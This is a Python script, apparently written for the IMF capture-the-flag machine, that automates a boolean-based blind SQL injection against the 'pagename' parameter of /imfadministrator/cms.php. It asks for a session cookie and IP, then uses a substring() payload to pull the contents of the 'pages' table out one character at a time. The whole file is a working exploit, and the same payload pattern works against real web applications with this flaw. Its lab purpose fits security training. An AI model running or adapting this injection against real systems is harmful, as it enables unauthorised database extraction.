#!/usr/bin/env python3

#Imports
import os
import signal, string, requests
# Script en python que permite obtener informacion mediante una inyeccion SQL Boolean a ciegas para la maquina IMF (usar despues de entrar a IMF CMS)
# Creado por: JhonWich
# Requisitos
# 1.- Tener copiada tu cookie de sesión el script te la pedira para poder continuar.
# 2.- Tener copiada la direccion ip de la maquina para que el script pueda funcionar.
# 3.- 
def blind_sql_injection():

    PHPSESSID = input("\nIngresa tu cookie de session (PHPSESSID): \n")
    IMF_IP = input("\nIngresa la ip de la maquina IMF: \n")
    #Main URL union
    #====================================================
    URL_BEGIN = "http://"
    URL_END = "/imfadministrator/cms.php?pagename="
    MAIN_URL = URL_BEGIN +  IMF_IP + URL_END 
    #====================================================
    os.system('cls' if os.name == 'nt' else 'clear')
    print("======== Ejecutando Boolean-Based-blind.py ========")
    print(f"\nPHPSESSID: {PHPSESSID}")
    print(f"SQL injection to: {MAIN_URL}")

    characters = string.ascii_lowercase + string.digits + "_,./#"
    information = ""
    print(f"PHPSESSID={PHPSESSID}")
    headers = {
            'cookie': f"PHPSESSID={PHPSESSID}"
            }
    print(headers)
    for position in range(1,200):
        for character in characters:
            sqli_url = MAIN_URL + f"home' or substring((select group_concat(pagename,'-',pagedata) from pages),{position},1)='{character}"
            
            r = requests.get(sqli_url, headers=headers)
 
            if "Welcome to the IMF Administration." not in r.text:
                information += character
                break
    return information

if __name__ == '__main__':

    print("\n\n ** Script que te permite obterner información mediante una inyección SQL para la maquina IMF **\n")
    print("\n =============== REQUISITOS ========================")
    print("|1)Debes de haber llegado a hasta el panel cms.php  |")
    print("|2)Tener copiada tu cookie de sesión (PHPSESSID)    |")
    print("|3)Tener copiada la direción ip de la maquina       |")
    print(" ===================================================")

    input("\n\n=== Presione ENTER para continuar... ===")

    print(blind_sql_injection())

    print("script terminado, ¡Good Luck!")
